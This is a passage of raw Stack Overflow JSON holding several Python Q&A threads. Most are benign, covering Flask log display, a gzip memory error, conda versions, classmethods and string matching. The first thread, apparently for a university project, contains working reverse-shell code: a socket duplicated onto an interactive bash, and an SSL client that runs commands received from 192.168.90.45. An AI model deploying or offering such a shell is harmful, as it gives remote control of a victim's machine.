"https://www.gravatar.com/avatar/7441c0391fc53a40ced7c6143fd4345a?s=128&d=identicon&r=PG&f=1", "display_name": "Chev_603", "link": "https://stackoverflow.com/users/4930299/chev-603"}, "is_accepted": false, "score": 1, "last_activity_date": 1601845129, "last_edit_date": 1601845129, "creation_date": 1498101163, "answer_id": 44689512, "question_id": 37174193, "link": "https://stackoverflow.com/questions/37174193/reverse-shell-over-ssl-in-python/44689512#44689512", "title": "Reverse shell over SSL in python", "body": "<p>Old question but this was my solution, exactly as Steffen Ullrich said;</p>\n<pre><code>import os\nimport socket\nimport subprocess\nimport ssl\n\n# Create a socket\ndef socket_create():\n    try:\n        global host\n        global port\n        global ssls\n        global s\n        host = '192.168.90.45'\n        port = 8080\n        s = socket.socket()\n        ssls = ssl.wrap_socket(\n            s, \n            ssl_version=ssl.PROTOCOL_TLSv1\n            )\n    except socket.error as msg:\n        print('Socket creation error: ' + str(msg))\n\n# Connect to a remote socket\ndef socket_connect():\n    try:\n        ssls.connect((host, port))\n        ssls.send(str.encode(str(os.getcwd()) + ' &gt; '))\n    except socket.error as msg:\n        print('Socket connection error: ' + str(msg))\n\n# Receive commands from remote server and run on local machine\ndef receive_commands():\n    while True:\n        data = ssls.recv(1024)\n        data = data.decode(&quot;utf-8&quot;).strip()\n        print('Received: ' + data)\n        if data[:2] == 'cd':\n            os.chdir(data[3:])\n            ssls.send(str.encode(str(os.getcwd()) + ' &gt; '))\n        elif len(data) &gt; 0:\n            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            output_bytes = cmd.stdout.read() + cmd.stderr.read()\n            output_str = str(output_bytes.decode(&quot;utf-8&quot;))\n            ssls.send(str.encode(output_str + str(os.getcwd()) + ' &gt; '))\n            if len(output_str.split('\\n')) &gt; 2:\n                nL = 2\n            else:\n                nL = 0\n            print('Sent: ' + nL * '\\n' + output_str)\n        if not data:\n            break\n    s.close()\n\ndef main():\n    socket_create()\n    socket_connect()\n    receive_commands()\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n"}], "owner": {"reputation": 624, "user_id": 4709695, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/26b4a5cf96926a9c3b6f030d0006d9f0?s=128&d=identicon&r=PG&f=1", "display_name": "Sidahmed", "link": "https://stackoverflow.com/users/4709695/sidahmed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1414, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1601845129, "creation_date": 1463004956, "last_edit_date": 1463013464, "question_id": 37174193, "link": "https://stackoverflow.com/questions/37174193/reverse-shell-over-ssl-in-python", "title": "Reverse shell over SSL in python", "body": "<p>For my university project, I have to create a remote access tool with python. I\u00a0can do it easily on a simple TCP socket, but when it comes to an SSL socket, I get problems.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>#/usr/bin/python3\n\nimport socket\nimport ssl\nimport subprocess\nimport os\n\n# SET VARIABLES\nHOST, PORT = '127.0.0.1', 1234\n\n# CREATE SOCKET\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(10)\n\n# WRAP SOCKET\nsock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)\n\nsock.connect((HOST, PORT))\nos.dup2(sock.fileno(), 0)\nos.dup2(sock.fileno(), 1)\nos.dup2(sock.fileno(), 2)\n\np = subprocess.call([\"/bin/bash\", \"-i\"])\n</code></pre>\n\n<p>When I try to listen on the other side with <code>ncat --ssl -nlvp 1234</code>, the reverse shell connects and disconnects immediately, nothing appears; And if I remove the <code>sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)</code> I get a working backdoor, but on a plain text socket.</p>\n\n<p>Can anyone explain the problem to me please? And maybe give me a solution?</p>\n"}, {"tags": ["python", "html", "flask", "jinja2"], "comments": [{"owner": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "edited": false, "score": 0, "creation_date": 1463005235, "post_id": 37174190, "comment_id": 61883108, "body": "How large will your log file be? For very short logs this should be a workable solution. Also how many users do you want to access the page?"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463006098, "post_id": 37174190, "comment_id": 61883437, "body": "If the file is really big you wouldn&#39;t typically show it all in a single page anyway. You&#39;d paginate the results, say 1000 lines per page."}, {"owner": {"reputation": 49, "user_id": 6047660, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T_bKjfwuaHo/AAAAAAAAAAI/AAAAAAAAAAA/B-7r5n3OumY/photo.jpg?sz=128", "display_name": "Ben Parmeter", "link": "https://stackoverflow.com/users/6047660/ben-parmeter"}, "reply_to_user": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "edited": false, "score": 0, "creation_date": 1463010650, "post_id": 37174190, "comment_id": 61884745, "body": "@H2O This is for a home project and the log files are probably going to be relatively small (i.e. a month of activity on a garage door).  Probably never more than 2 users at a time."}, {"owner": {"reputation": 49, "user_id": 6047660, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T_bKjfwuaHo/AAAAAAAAAAI/AAAAAAAAAAA/B-7r5n3OumY/photo.jpg?sz=128", "display_name": "Ben Parmeter", "link": "https://stackoverflow.com/users/6047660/ben-parmeter"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463010657, "post_id": 37174190, "comment_id": 61884746, "body": "@Alex Hall you&#39;re definitely right that the pagination solution would be a better option if the file is indeed that large.  I may go that route, thanks!"}, {"owner": {"reputation": 49, "user_id": 6047660, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T_bKjfwuaHo/AAAAAAAAAAI/AAAAAAAAAAA/B-7r5n3OumY/photo.jpg?sz=128", "display_name": "Ben Parmeter", "link": "https://stackoverflow.com/users/6047660/ben-parmeter"}, "reply_to_user": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "edited": false, "score": 0, "creation_date": 1463010737, "post_id": 37174190, "comment_id": 61884768, "body": "In general, I definitely going to use the above for my current project, but was academically curious if I was doing it correctly or if there were better more system friendly ways of handling it.  I think @H2O fully answered my question below so he/she gets the green check mark. :)"}, {"owner": {"reputation": 15081, "user_id": 978961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9562cbc3556ac68f081dfda387a9f4ab?s=128&d=identicon&r=PG", "display_name": "dirn", "link": "https://stackoverflow.com/users/978961/dirn"}, "edited": false, "score": 0, "creation_date": 1463017039, "post_id": 37174190, "comment_id": 61886208, "body": "You don&#39;t need <code>range</code>. You can iterate over <code>event_lines</code>. <code>for line in event_lines:</code> You can further reduce this to a comprehension. <code>door_history = [line.split(&#39; &#39;) for line in event_log]</code>"}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 6047660, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T_bKjfwuaHo/AAAAAAAAAAI/AAAAAAAAAAA/B-7r5n3OumY/photo.jpg?sz=128", "display_name": "Ben Parmeter", "link": "https://stackoverflow.com/users/6047660/ben-parmeter"}, "edited": false, "score": 1, "creation_date": 1463010801, "post_id": 37174666, "comment_id": 61884783, "body": "Thanks!  This is exactly the kind of thorough response I was hoping for.  I&#39;m just learning Python (and Flask) and this is definitely a big help in my journey."}], "tags": [], "owner": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "is_accepted": true, "score": 1, "last_activity_date": 1463007762, "creation_date": 1463007762, "answer_id": 37174666, "question_id": 37174190, "link": "https://stackoverflow.com/questions/37174190/what-is-the-proper-way-to-read-a-text-file-and-display-in-html-via-flask-python/37174666#37174666", "title": "What is the proper way to read a text file and display in HTML via Flask/Python?", "body": "<p>I would not say that your way is exactly the proper way of doing this. However for a small application it will work and be faster than most other solutions.</p>\n\n<p>If your log file grows over time you would not want to show it in it's entirety. Instead you might want to implement only showing the latest 10 or so events, offering a second page with more events (pagination).\nIn this case you could probably still work with an adapted version of the above solution.</p>\n\n<p>If however you either have lots of page views or want to have advanced features such as: showing the last week of events, just showing door opening events or showing all door opening events that happend in the first calendar week. Then you would want to make your data more accessible by importing it into some kind of database.</p>\n\n<p>You might use SQLite as a database though if you really have a lot of users something like PostgreSQL would be the better option. You would not import the data in your views instead you would have a dedicated task running that updates your database every now an again. In the simplest case this might be a cronjob that just runs every minute. You might also use a more advanced solution like celery, in either case you might end up with slightly outdated data in your database and therefore your website, there isn't really a way around this.</p>\n\n<p>For information on how to integrate a database into your application see the <a href=\"http://flask.pocoo.org/docs/0.10/tutorial/\" rel=\"nofollow\">official flask documentation</a>. \nFor more information on celery (for regular database updates) take a look at the <a href=\"http://flask.pocoo.org/docs/0.10/patterns/celery/\" rel=\"nofollow\">flask documentation on the topic</a>. The slightly more hacky way to do this would be cron jobs, as explained <a href=\"https://help.ubuntu.com/community/CronHowto\" rel=\"nofollow\">here</a>.</p>\n\n<p>All that being said: if this is just a simple home project and you are not in for the learning experience your current solution will 100% suffice.\nIf you are interested in learing more or want lots of people to use</p>\n"}], "owner": {"reputation": 49, "user_id": 6047660, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T_bKjfwuaHo/AAAAAAAAAAI/AAAAAAAAAAA/B-7r5n3OumY/photo.jpg?sz=128", "display_name": "Ben Parmeter", "link": "https://stackoverflow.com/users/6047660/ben-parmeter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3039, "favorite_count": 0, "accepted_answer_id": 37174666, "answer_count": 1, "score": 0, "last_activity_date": 1463007762, "creation_date": 1463004942, "question_id": 37174190, "link": "https://stackoverflow.com/questions/37174190/what-is-the-proper-way-to-read-a-text-file-and-display-in-html-via-flask-python", "title": "What is the proper way to read a text file and display in HTML via Flask/Python?", "body": "<p>Specifically, let's talk about large text/log files that we want to display in HTML.  I've seen various methods, but for scalability purposes, </p>\n\n<p>What I would like to do, is take a log file with space separated data and then put this into a table displayed in HTML. </p>\n\n<p>Example from the text file:</p>\n\n<pre><code>2016-05-10 21:13:56.030616 Button_Pressed\n2016-05-10 21:14:44.534093 Door_Opened\n2016-05-10 21:14:46.850801 Button_Pressed\n2016-05-10 21:15:04.383880 Door_Closed\n</code></pre>\n\n<p>I'd like to take each line and convert this to a table with headings \"Date, Time, Event\".  </p>\n\n<p>The easy way would be to use some kind of list, where we read each line into the list, then pass the list to the HTML on a return.  </p>\n\n<p>Example Python code excerpt from a Flask web app (app.py):</p>\n\n<pre><code>@app.route('/history')\ndef history():\n\n    with open('events.log') as event_log:\n    event_lines = event_log.readlines()\n\n    door_history = []\n    events = len(event_lines)\n\n    for x in range(events):\n        door_history.append(event_lines[x].split(\" \"))\n\n    return render_template('door-log.html', events=events, door_history=door_history)\n</code></pre>\n\n<p>Example HTML/Jinja code excerpt from the Flask web app (door-log.html)</p>\n\n<pre><code>&lt;table&gt;\n    &lt;tr&gt;\n        &lt;th&gt;Date&lt;/th&gt;\n        &lt;th&gt;Time&lt;/th&gt;\n        &lt;th&gt;Event&lt;/th&gt;\n    &lt;/tr&gt;\n\n    {% for row in range(events) %}\n        &lt;tr&gt;\n            {% for column in range(3) %}\n            &lt;td&gt; {{ door_history[row][column] }} &lt;/td&gt;\n            {% endfor %}\n        &lt;/tr&gt;\n    {% endfor %}\n&lt;/table&gt;\n</code></pre>\n\n<p>However, for this method, would this not be the best use of memory?  Would it scale if you had many people accessing the same page?  Is this the proper way to do this kind of thing?  </p>\n"}, {"tags": ["python", "out-of-memory"], "comments": [{"owner": {"reputation": 49730, "user_id": 349130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e4efeebbf6994bb904738c4fb8922bf?s=128&d=identicon&r=PG", "display_name": "Dr. Snoopy", "link": "https://stackoverflow.com/users/349130/dr-snoopy"}, "edited": false, "score": 1, "creation_date": 1463009744, "post_id": 37174174, "comment_id": 61884480, "body": "Can you include the real code and real errors in your question?"}, {"owner": {"reputation": 709, "user_id": 583088, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/9c02e06d197dea0eae72a635f31f3991?s=128&d=identicon&r=PG", "display_name": "user583088", "link": "https://stackoverflow.com/users/583088/user583088"}, "reply_to_user": {"reputation": 49730, "user_id": 349130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e4efeebbf6994bb904738c4fb8922bf?s=128&d=identicon&r=PG", "display_name": "Dr. Snoopy", "link": "https://stackoverflow.com/users/349130/dr-snoopy"}, "edited": false, "score": 0, "creation_date": 1463432573, "post_id": 37174174, "comment_id": 62053045, "body": "this is the real code. and i get memory error on my  machine ."}, {"owner": {"reputation": 709, "user_id": 583088, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/9c02e06d197dea0eae72a635f31f3991?s=128&d=identicon&r=PG", "display_name": "user583088", "link": "https://stackoverflow.com/users/583088/user583088"}, "reply_to_user": {"reputation": 49730, "user_id": 349130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e4efeebbf6994bb904738c4fb8922bf?s=128&d=identicon&r=PG", "display_name": "Dr. Snoopy", "link": "https://stackoverflow.com/users/349130/dr-snoopy"}, "edited": false, "score": 0, "creation_date": 1463433120, "post_id": 37174174, "comment_id": 62053312, "body": "&quot;C:\\Python27\\lib\\gzip.py&quot;, line 320, in _read   self._add_read_data( uncompress )    &quot;C:\\Python27\\lib\\gzip.py&quot;, line 338, in _add_read_data  self.extrabuf = self.extrabuf[offset:] + data MemoryError"}, {"owner": {"reputation": 709, "user_id": 583088, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/9c02e06d197dea0eae72a635f31f3991?s=128&d=identicon&r=PG", "display_name": "user583088", "link": "https://stackoverflow.com/users/583088/user583088"}, "reply_to_user": {"reputation": 49730, "user_id": 349130, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e4efeebbf6994bb904738c4fb8922bf?s=128&d=identicon&r=PG", "display_name": "Dr. Snoopy", "link": "https://stackoverflow.com/users/349130/dr-snoopy"}, "edited": false, "score": 0, "creation_date": 1463433161, "post_id": 37174174, "comment_id": 62053339, "body": "Traceback (most recent call last):  &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;    &quot;C:\\Python27\\lib\\site-packages\\spyderlib\\widgets\\externalshe&zwnj;&#8203;ll\\sitecustomize.py&quot;&zwnj;&#8203;, line 601, in runfile     execfile(filename, namespace)    &quot;C:\\Python27\\lib\\site-packages\\spyderlib\\widgets\\externalshe&zwnj;&#8203;ll\\sitecustomize.py&quot;&zwnj;&#8203;, line 66, in execfile     exec(compile(scripttext, filename, &#39;exec&#39;), glob, loc)    &quot;C:/new.py&quot;, line 6, in &lt;module&gt; train_set, valid_set, test_set = cPickle.load(f)    &quot;C:\\Python27\\lib\\gzip.py&quot;, line 268, in read self._read(readsize)    &quot;C:\\Python27\\lib\\gzip.py&quot;, line 320, in _read"}], "owner": {"reputation": 709, "user_id": 583088, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/9c02e06d197dea0eae72a635f31f3991?s=128&d=identicon&r=PG", "display_name": "user583088", "link": "https://stackoverflow.com/users/583088/user583088"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 30, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1463015486, "creation_date": 1463004855, "last_edit_date": 1463015486, "question_id": 37174174, "link": "https://stackoverflow.com/questions/37174174/deep-leaning-based-on-theano-example-error", "title": "deep leaning based on theano example error", "body": "<p>I am trying to run theano based python example from</p>\n\n<p><a href=\"http://deeplearning.net/tutorial/gettingstarted.html#\" rel=\"nofollow\">http://deeplearning.net/tutorial/gettingstarted.html#</a></p>\n\n<pre><code>import cPickle, gzip\n# Load the dataset\n\nf = gzip.open('mnist.pkl.gz', 'rb')\n\ntrain_set, valid_set, test_set = cPickle.load(f)\n\nf.close()\n</code></pre>\n\n<p>I get error </p>\n\n<blockquote>\n  <p>self.extrabuf = self.extrabuf[offset:] + data MemoryError</p>\n</blockquote>\n\n<p>I understand this is a memory issue but I am working on CPU machine with 32gb of ram.</p>\n\n<p>I don't really understand the error. Is that buff allocated in szlib is small to handle it, if so can I increase the memory allocation.</p>\n"}, {"tags": ["python", "conda"], "answers": [{"tags": [], "owner": {"reputation": 8102, "user_id": 61915, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5cb55327ace7100e0baeb4a9cd4f2868?s=128&d=identicon&r=PG", "display_name": "Edison Gustavo Muenz", "link": "https://stackoverflow.com/users/61915/edison-gustavo-muenz"}, "is_accepted": true, "score": 2, "last_activity_date": 1463170374, "creation_date": 1463170374, "answer_id": 37218657, "question_id": 37174167, "link": "https://stackoverflow.com/questions/37174167/downgrading-and-upgrading-python-libraries-using-conda/37218657#37218657", "title": "Downgrading and upgrading python libraries using conda", "body": "<h1>tl;dr;</h1>\n\n<p>Probably not, since numpy <code>1.10 -&gt; 1.11</code> is not a HUGE leap.</p>\n\n<h1>Recommended approach</h1>\n\n<p>I would advise against not letting conda match the correct versions of each package. You can get wrong results or crashes.</p>\n\n<h1>Longer explanation</h1>\n\n<p>The recipe for <code>iris</code> was built using numpy 1.10, so if you force numpy back to 1.11, you might have problems such as:</p>\n\n<ul>\n<li><em>crashes</em>: if <code>iris</code> is compiled against NumPy (using its C Api)</li>\n<li><em>wrong results</em>: if <code>iris</code> uses an API of numpy changed between versions</li>\n<li><em>python exceptions</em>: if <code>iris</code> uses an API of numpy in which the implementation changed between versions.</li>\n</ul>\n\n<p>I know that recently numpy demands that <strong>indices</strong> of numpy arrays be <strong>integers only</strong>. This broke some code. I don't remember which version of numpy did that.</p>\n\n<p>This is true for all packages, not only numpy. Some libraries maintain API and/or ABI compatibility between releases, others don't.</p>\n\n<p>All in all, numpy has a fairly stable API. I can't really answer for its ABI, since I don't know.</p>\n"}], "owner": {"reputation": 18736, "user_id": 308827, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/28f523030f3ecd9c9f2ad23ca745cc65?s=128&d=identicon&r=PG", "display_name": "user308827", "link": "https://stackoverflow.com/users/308827/user308827"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 538, "favorite_count": 0, "accepted_answer_id": 37218657, "answer_count": 1, "score": 1, "last_activity_date": 1463170374, "creation_date": 1463004834, "question_id": 37174167, "link": "https://stackoverflow.com/questions/37174167/downgrading-and-upgrading-python-libraries-using-conda", "title": "Downgrading and upgrading python libraries using conda", "body": "<p>I frequently install python packages using conda, sometimes that involves downgrading an existing installed package. Afterwards, I upgrade the downgraded package to latest version again.</p>\n\n<p>E.g.</p>\n\n<pre><code>conda install -c conda-forge iris\n</code></pre>\n\n<p>downgrades numpy to 1.10.4 from 1.11.x. Later, I do <code>conda update numpy</code> to go back to <code>1.11.x</code></p>\n\n<p>Is this ok to do or can lead to subtle issues later?</p>\n"}, {"tags": ["python", "class-method"], "answers": [{"tags": [], "owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "is_accepted": true, "score": 1, "last_activity_date": 1463005246, "creation_date": 1463005246, "answer_id": 37174243, "question_id": 37174144, "link": "https://stackoverflow.com/questions/37174144/in-python-what-happens-when-an-instance-of-a-class-calls-a-classmethod/37174243#37174243", "title": "in python what happens when an instance of a class calls a @classmethod", "body": "<blockquote>\n  <p>My guess is when I call it from a instance the self (which becomes a cls) is the class itself not the instance created</p>\n</blockquote>\n\n<p>Yup.</p>\n\n<blockquote>\n  <p>and I'm trying to do Model.getValueOrDefault but shouldn't it give me some error that tells me I can't call a function without initializing the class?</p>\n</blockquote>\n\n<p>Nope. It's entirely valid to call <code>Model.getValueOrDefault</code>, but you have to pass <code>self</code> explicitly when you do that.</p>\n"}], "owner": {"reputation": 447, "user_id": 4168116, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/31f7ab4433462c3893961bb3112fec1a?s=128&d=identicon&r=PG&f=1", "display_name": "demalegabi", "link": "https://stackoverflow.com/users/4168116/demalegabi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 37174243, "answer_count": 1, "score": 0, "last_activity_date": 1463005246, "creation_date": 1463004765, "question_id": 37174144, "link": "https://stackoverflow.com/questions/37174144/in-python-what-happens-when-an-instance-of-a-class-calls-a-classmethod", "title": "in python what happens when an instance of a class calls a @classmethod", "body": "<p>so I have a class Model and inside model I have a method save</p>\n\n<pre><code>def save(self):\n    args = list(map(self.getValueOrDefault,self.__fields__))\n    args.append(self.getValueOrDefault(self.__primary_key__))\n    logging.debug('saving %s' % str(args))\n    row = yield from execute(self.__insert__,args)\n    if row != 1:\n        logging.debug('failed to insert record: affected rows: %s' % row)\n    else:\n        logging.info('insertion was succesful')\n</code></pre>\n\n<p>here is the code for getValueOrDefault, they are in the same class</p>\n\n<pre><code>def getValueOrDefault(self,key):\n    value = getattr(self,key)\n    if value is None:\n        field = self.__mapping__[key]\n        if field.default is not None:\n            value = field.default() if callable(field.default) else field.default\n            logging.info('using default value for %s ==&gt; %s' % (key,value))\n            setattr(self,key,value)\n    return value\n</code></pre>\n\n<p>if I add classmethod to save and call save from an instance I get an error saying getValueOrDefault requires additional positional argument 'key'. My guess is when I call it from a instance the self (which becomes a cls) is the class itself not the instance created and I'm trying to do Model.getValueOrDefault but shouldn't it give me some error that tells me I can't call a function without initializing the class?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 2180, "user_id": 5202687, "user_type": "registered", "accept_rate": 97, "profile_image": "https://lh5.googleusercontent.com/-c4Jsqv7BnwQ/AAAAAAAAAAI/AAAAAAAACk8/ZP5eNp86l8o/photo.jpg?sz=128", "display_name": "Peter David Carter", "link": "https://stackoverflow.com/users/5202687/peter-david-carter"}, "edited": false, "score": 0, "creation_date": 1463007023, "post_id": 37174119, "comment_id": 61883709, "body": "Are you wanting a method to combine <code>for</code> and <code>if</code> or are you wanting to get your <code>for</code> loop with nested <code>if</code> statement working properly?"}], "answers": [{"comments": [{"owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "edited": false, "score": 0, "creation_date": 1463004859, "post_id": 37174142, "comment_id": 61882979, "body": "note that this isn&#39;t exactly identical to the original nested loop, since that loop will run <code>print &#39;found&#39;</code> N times (where N is now many elements in <code>people.split(&#39;,&#39;)</code> are present in <code>test</code>."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "edited": false, "score": 2, "creation_date": 1463004935, "post_id": 37174142, "comment_id": 61883003, "body": "@AdamSmith, the OP wants to know if any word matches, they were just using any wrong as per their second snippet"}, {"owner": {"reputation": 44495, "user_id": 3058609, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/2c0357556707713572abbf637a907ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Adam Smith", "link": "https://stackoverflow.com/users/3058609/adam-smith"}, "edited": false, "score": 1, "creation_date": 1463005006, "post_id": 37174142, "comment_id": 61883032, "body": "Oh I agree, I&#39;m just pointing out the difference between the example code and the result code. What OP wants to do is almost certainly this (even if he doesn&#39;t know it!!)"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1472068929, "post_id": 37174142, "comment_id": 65609524, "body": "Don&#39;t you need to use <code>test.split(&quot;_&quot;)</code> to get the words in the input string?"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1472074753, "post_id": 37174142, "comment_id": 65612239, "body": "@Barmar,  the OP is testing if any word after splitting people on a comma  is in the string. <i>I need to check if any of the items in the string (or list after split) are present in a long string.</i> If they wanted to avoid match <code>first</code> in  <code>hello_firsts</code> yes they would need to split but maybe <code>_</code> could be anything, if so the correct solution would be a regex with word boundaries."}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": true, "score": 2, "last_activity_date": 1463005107, "last_edit_date": 1463005107, "creation_date": 1463004754, "answer_id": 37174142, "question_id": 37174119, "link": "https://stackoverflow.com/questions/37174119/check-a-string-for-any-items-in-an-array/37174142#37174142", "title": "Check a string for any items in an array", "body": "<p>Use any checking if any word  is in test :</p>\n\n<pre><code>if any(word in test for word in people.split(\",\")):\n   # do whatever\n</code></pre>\n\n<p>Your logic is incorrect as you are checking test is in the split list of words which does not match your first loop.</p>\n"}], "owner": {"reputation": 307, "user_id": 5280950, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/6e26eaee96d0aa35c5f5afacb6e464d7?s=128&d=identicon&r=PG&f=1", "display_name": "Victor", "link": "https://stackoverflow.com/users/5280950/victor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "accepted_answer_id": 37174142, "answer_count": 1, "score": 0, "last_activity_date": 1463012072, "creation_date": 1463004673, "last_edit_date": 1463012072, "question_id": 37174119, "link": "https://stackoverflow.com/questions/37174119/check-a-string-for-any-items-in-an-array", "title": "Check a string for any items in an array", "body": "<p>I have an string (items with comma separated) and I need to check if any of the items in the string (or list after split) are present in a long string.</p>\n\n<p>I know how to do this in a long style like:</p>\n\n<pre><code>people=\"first,second\"\ntest='hello_first'\n\nfor i in people.split(\",\"):\n    if i in test :\n          print 'found'\n</code></pre>\n\n<p>Is there a better way to combine <code>for</code> and <code>if</code> in one line ?</p>\n\n<p>e.g. using <code>any</code> or something?</p>\n\n<pre><code>if any(x in people.split(\",\") for x in test) :\n    print 'found'\n</code></pre>\n\n<p>doesn't seem to print 'found'. </p>\n"}, {"tags": ["python", "matrix"], "comments": [{"owner": {"reputation": 576, "user_id": 5504459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5433245ceb1d5feb805dbcbd9f462bc5?s=128&d=identicon&r=PG&f=1", "display_name": "mark s.", "link": "https://stackoverflow.com/users/5504459/mark-s"}, "edited": false, "score": 5, "creation_date": 1463005215, "post_id": 37174081, "comment_id": 61883099, "body": "Can you explain your expected output and/or input? An adjacency matrix doesn&#39;t seem to make sense based on what you&#39;ve provided."}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463006124, "post_id": 37174081, "comment_id": 61883441, "body": "Yeah, I&#39;m not seeing how 